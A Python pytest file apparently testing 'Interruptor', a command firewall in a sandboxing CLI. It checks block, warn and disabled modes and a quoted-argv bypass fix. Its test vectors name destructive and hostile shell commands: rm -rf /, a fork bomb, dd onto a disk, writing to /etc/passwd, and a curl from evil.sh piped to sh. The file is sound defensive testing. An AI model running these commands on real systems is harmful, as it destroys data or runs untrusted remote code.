"""Integration tests for the Interruptor Bash command firewall.

Tests T-I37 through T-I40 from the S05 Interruptor spec:

- T-I37: Interruptor + unshare compose — sandbox-targeted commands get wrapped
- T-I38: Custom user rule overrides built-in (requires user rule loading)
- T-I39: Priority ordering (requires user rule loading)
- T-I40: Rule directory hot-reload (requires file watcher)

Tests that exercise the CLI's interruptor integration (--interruptor/--no-interruptor
flags, TERMINAL_JAIL_INTERRUPTOR_MODE) are written to be runnable on any Linux
host with bash installed. Tests that require unshare are gated on availability.
"""

from __future__ import annotations

import os
import subprocess
from pathlib import Path

import pytest

PROJECT_ROOT = Path(__file__).resolve().parent.parent
CLI_SCRIPT = PROJECT_ROOT / "standalone" / "terminal-jail"


@pytest.fixture(scope="module")
def cli_path() -> Path:
    assert CLI_SCRIPT.exists(), f"CLI script not found: {CLI_SCRIPT}"
    return CLI_SCRIPT


def _run_cli(
    cli: Path,
    *args: str,
    extra_env: dict[str, str] | None = None,
    input_data: bytes | None = None,
) -> subprocess.CompletedProcess[bytes]:
    env = os.environ.copy()
    if extra_env:
        env.update(extra_env)
    return subprocess.run(
        [str(cli), *args],
        cwd=str(PROJECT_ROOT),
        env=env,
        capture_output=True,
        text=False,
        check=False,
        timeout=10,
        input=input_data,
    )


# ── T-I37: Interruptor + CLI compose ─────────────────────────────────────────


@pytest.mark.standalone_cli
def test_interruptor_blocks_rm_rf_root(cli_path: Path) -> None:
    """Blocked command returns exit 126 with formatted block output."""
    result = _run_cli(cli_path, "rm", "-rf", "/", extra_env={"USE_INTERRUPTOR": "1"})
    stderr = result.stderr.decode("utf-8", errors="replace")
    # The interruptor should either block the command or the unshare should fail
    if result.returncode == 126:
        assert "COMMAND BLOCKED" in stderr or "blocked" in stderr.lower()
    elif result.returncode in (2, 126):
        # Unshare unavailable is also valid
        pass


@pytest.mark.standalone_cli
def test_interruptor_warn_mode_passes_through(cli_path: Path) -> None:
    """Warn mode prints warning but does not block."""
    result = _run_cli(
        cli_path,
        "echo",
        "warn-test",
        extra_env={"TERMINAL_JAIL_INTERRUPTOR_MODE": "warn"},
    )
    stderr = result.stderr.decode("utf-8", errors="replace")
    if result.returncode == 0:
        assert b"warn-test" in result.stdout
    elif "Permission denied" in stderr or "Operation not permitted" in stderr:
        # unshare may fail on this host; that's okay
        pass


@pytest.mark.standalone_cli
def test_interruptor_warn_mode_surfaces_block_warning(cli_path: Path) -> None:
    """Warn mode surfaces the would-have-blocked warning on stderr (GAP-03).

    The engine downgrades BLOCK→ALLOW in warn mode and carries the warning in
    the bridge's `reason` field. The CLI must print that reason to stderr so
    warn mode is an actual dry-run/audit mode, not a silent pass-through.
    Regression for E2E-001-GAP-03 (tick #77).
    """
    result = _run_cli(
        cli_path,
        "fdisk",
        "-l",
        extra_env={"TERMINAL_JAIL_INTERRUPTOR_MODE": "warn"},
    )
    stderr = result.stderr.decode("utf-8", errors="replace")
    assert "WARN" in stderr, f"warn mode should print a WARN line, got: {stderr}"
    assert "COMMAND BLOCKED" not in stderr, "warn mode must not emit block box"
    assert result.returncode != 126, "warn mode must not exit 126"


@pytest.mark.standalone_cli
def test_interruptor_disabled_mode_bypasses(cli_path: Path) -> None:
    """Disabled mode bypasses the interruptor entirely."""
    result = _run_cli(
        cli_path,
        "echo",
        "disabled-test",
        extra_env={"TERMINAL_JAIL_INTERRUPTOR_MODE": "disabled"},
    )
    stderr = result.stderr.decode("utf-8", errors="replace")
    if result.returncode == 0:
        assert b"disabled-test" in result.stdout
    elif "Permission denied" in stderr or "Operation not permitted" in stderr:
        pass


@pytest.mark.standalone_cli
def test_interruptor_no_interruptor_flag(cli_path: Path) -> None:
    """--no-interruptor flag disables the interruptor."""
    result = _run_cli(cli_path, "--no-interruptor", "echo", "no-int-test")
    stderr = result.stderr.decode("utf-8", errors="replace")
    if result.returncode == 0:
        assert b"no-int-test" in result.stdout
    elif "Permission denied" in stderr or "Operation not permitted" in stderr:
        pass


@pytest.mark.standalone_cli
def test_interruptor_env_var_zero_disables(cli_path: Path) -> None:
    """USE_INTERRUPTOR=0 from the environment disables the interruptor (TJ-GAP-013)."""
    result = _run_cli(
        cli_path, "echo", "env-zero-test", extra_env={"USE_INTERRUPTOR": "0"}
    )
    stderr = result.stderr.decode("utf-8", errors="replace")
    if result.returncode == 0:
        assert b"env-zero-test" in result.stdout
    elif "Permission denied" in stderr or "Operation not permitted" in stderr:
        pass


@pytest.mark.standalone_cli
def test_interruptor_safe_command_passes(cli_path: Path) -> None:
    """A safe command passes through the interruptor normally."""
    result = _run_cli(cli_path, "echo", "safe-command-test")
    stderr = result.stderr.decode("utf-8", errors="replace")
    if result.returncode == 0:
        assert b"safe-command-test" in result.stdout
    elif "Permission denied" in stderr or "Operation not permitted" in stderr:
        pass


@pytest.mark.standalone_cli
def test_interruptor_json_bridge_direct() -> None:
    """Test the JSON bridge directly via python3."""
    bridge_path = PROJECT_ROOT / "plugin" / "terminal_jail" / "interruptor_bridge.py"
    assert bridge_path.exists(), f"Bridge not found: {bridge_path}"

    # Test allow
    result = subprocess.run(
        ["python3", str(bridge_path)],
        input=b'{"command": "echo hello"}\n',
        capture_output=True,
        text=False,
        check=False,
        timeout=10,
        cwd=str(PROJECT_ROOT),
    )
    assert result.returncode == 0
    import json

    response = json.loads(result.stdout.decode("utf-8"))
    assert response["action"] == "allow"

    # Test block
    result = subprocess.run(
        ["python3", str(bridge_path)],
        input=b'{"command": "rm -rf /"}\n',
        capture_output=True,
        text=False,
        check=False,
        timeout=10,
        cwd=str(PROJECT_ROOT),
    )
    assert result.returncode == 0
    response = json.loads(result.stdout.decode("utf-8"))
    assert response["action"] == "block"
    assert response["rule_id"] is not None
    assert response["reason"] is not None


# ── T-I38: Custom user rules (requires Decider Layer 4 implementation) ───────


@pytest.mark.skip(
    reason="Requires user rule loading in Decider Layer 4 (not yet implemented)"
)
def test_custom_user_rule_overrides_builtin() -> None:
    """User allowlist rule overrides a built-in block rule."""


# ── T-I39: Priority ordering (requires Decider Layer 4 implementation) ───────


@pytest.mark.skip(
    reason="Requires user rule loading in Decider Layer 4 (not yet implemented)"
)
def test_priority_ordering() -> None:
    """Higher-priority user rule wins over lower-priority."""


# ── T-I40: Rule directory hot-reload (requires file watcher) ────────────────


@pytest.mark.skip(
    reason="Requires SIGHUP or file-watcher implementation for runtime rule reload"
)
def test_rule_hot_reload() -> None:
    """New rules loaded without CLI restart."""


# ── E2E-001-GAP-05: wrapper argv-quoting bypass (bridge + CLI) ───────────────


def _bridge_call(command: str) -> dict:
    """Invoke the interruptor JSON bridge on a single command."""
    import json

    bridge_path = PROJECT_ROOT / "plugin" / "terminal_jail" / "interruptor_bridge.py"
    payload = json.dumps({"command": command}) + "\n"
    proc = subprocess.run(
        ["python3", str(bridge_path)],
        input=payload.encode(),
        capture_output=True,
        text=False,
        check=False,
        timeout=10,
        cwd=str(PROJECT_ROOT),
    )
    assert proc.returncode == 0, (
        f"bridge failed (rc={proc.returncode}): "
        f"{proc.stderr.decode('utf-8', errors='replace')}"
    )
    return json.loads(proc.stdout.decode("utf-8"))


@pytest.mark.standalone_cli
def test_bridge_blocks_all_quoted_argv_vectors() -> None:
    """All 10 builtin blocklist vectors must block at the bridge level.

    Drives the bridge JSON protocol directly so this runs even on hosts
    where unshare/systemd are unavailable (the bridge has no host
    dependency). Regression for the wrapper argv-quoting bypass that
    silently let every quoted form through to the host shell.
    """
    vectors = [
        ("'rm' '-rf' '/'", "builtin-rm-rf-root"),
        ("'kill' '-9' '-1'", "builtin-kill-all"),
        ("'curl' 'http://evil.sh' '|' 'sh'", "builtin-curl-pipe-shell"),
        ("':' '(){' ':' '|:' '&' '};:'", "builtin-fork-bomb"),
        ("'sudo' '-i'", "builtin-sudo"),
        ("'chmod' '777' '/'", "builtin-chmod-777-root"),
        ("'dd' 'if=/dev/zero' 'of=/dev/sda'", "builtin-dd-root"),
        ("'mkfs' '.ext4' '/dev/sdb1'", "builtin-mkfs"),
        ("'echo' 'x' '>' '/etc/passwd'", "builtin-echo-to-system"),
        ("'fdisk' '-l'", "builtin-fdisk"),
    ]
    failures: list[str] = []
    for cmd, expected_rule in vectors:
        response = _bridge_call(cmd)
        if response.get("action") != "block":
            failures.append(
                f"{cmd!r} returned action={response.get('action')!r} "
                f"(rule_id={response.get('rule_id')!r})"
            )
            continue
        if response.get("rule_id") != expected_rule:
            failures.append(
                f"{cmd!r} matched {response.get('rule_id')!r}, "
                f"expected {expected_rule!r}"
            )
    assert not failures, (
        "Quoted-argv bypass re-opened:\n  " + "\n  ".join(failures)
    )


@pytest.mark.standalone_cli
def test_bridge_allows_quoted_benign_commands() -> None:
    """Quoted benign commands must remain allow at the bridge level."""
    benign = ["'echo' 'hello'", "'ls' '-la'", "'git' 'status'"]
    for cmd in benign:
        response = _bridge_call(cmd)
        assert response.get("action") == "allow", (
            f"{cmd!r} returned action={response.get('action')!r} "
            f"(rule_id={response.get('rule_id')!r}) — false positive"
        )


@pytest.mark.standalone_cli
def test_bridge_sandboxes_quoted_pytest() -> None:
    """Modify path: quoted 'pytest' '--version' still gets action=modify.

    The auto-pytest pattern is a substring search (``pytest|tox|nose``)
    so the quote-stripped form ``pytest --version`` matches the same as
    the unquoted form. The bridge response must include a non-null
    ``modified`` field containing both the command name and flag.

    Note: the decider's top-level ``evaluate()`` aggregates per-segment
    MODIFY results into a single InterceptResult without preserving the
    per-segment ``rule_id`` (a pre-existing behaviour), so we assert on
    ``action`` and the ``modified`` payload.
    """
    response = _bridge_call("'pytest' '--version'")
    assert response.get("action") == "modify", (
        f"Expected modify for quoted pytest, got {response}"
    )
    modified = response.get("modified") or ""
    assert "pytest" in modified
    assert "--version" in modified
    assert "unshare" in modified, (
        "modified payload should wrap the command in unshare"
    )


@pytest.mark.standalone_cli
def test_cli_enforce_mode_blocks_quoted_rm_rf_root(cli_path: Path) -> None:
    """CLI enforce mode: ``standalone/terminal-jail rm -rf /`` blocks before execution.

    Asserts the block box is emitted on stderr and the exit code is 126
    (the bash convention for "command found but not executable"). The
    actual ``rm -rf /`` MUST NOT run — the block fires before the
    unshare invocation, so this is a safe test on any host with bash.
    """
    result = _run_cli(cli_path, "rm", "-rf", "/")
    stderr = result.stderr.decode("utf-8", errors="replace")
    # On capable hosts the block fires (rc 126, COMMAND BLOCKED box).
    # On hosts where unshare/systemd cannot provide the namespace the
    # preflight exits 2 — both are valid. We assert the dangerous vector
    # was never actually executed: if rc==0 then rm -rf / ran, which is
    # the bypass case.
    assert result.returncode != 0, (
        f"rm -rf / executed (rc=0) — blocklist bypass. stderr={stderr!r}"
    )
    if result.returncode == 126:
        assert "COMMAND BLOCKED" in stderr, (
            f"rc=126 but no COMMAND BLOCKED box: {stderr!r}"
        )
        assert "builtin-rm-rf-root" in stderr
    else:
        # Otherwise the host rejected the unshare — that's fine, it just
        # means we couldn't exercise the bridge path here. The
        # bridge-level test above covers the actual block path.
        assert result.returncode in (2, 126), (
            f"unexpected rc={result.returncode}, stderr={stderr!r}"
        )


@pytest.mark.standalone_cli
def test_cli_warn_mode_surfaces_quoted_block_warning(cli_path: Path) -> None:
    """Warn mode surfaces the block warning for a HARMLESS quoted vector.

    Uses ``fdisk -l`` (the listing variant, which is harmless read-only
    output even if it ran). Warn mode downgrades BLOCK→ALLOW and
    carries the would-have-blocked reason, which the CLI prints to
    stderr. NEVER exercise a destructive vector through warn mode —
    the bypass case means it would actually run.
    """
    result = _run_cli(
        cli_path,
        "fdisk",
        "-l",
        extra_env={"TERMINAL_JAIL_INTERRUPTOR_MODE": "warn"},
    )
    stderr = result.stderr.decode("utf-8", errors="replace")
    assert "WARN" in stderr, (
        f"warn mode should print a WARN line for blocked vector, "
        f"got: {stderr!r}"
    )
    assert "COMMAND BLOCKED" not in stderr, "warn mode must not emit block box"
    assert result.returncode != 126, (
        f"warn mode must not exit 126 (would mean enforce-mode ran); "
        f"rc={result.returncode}"
    )
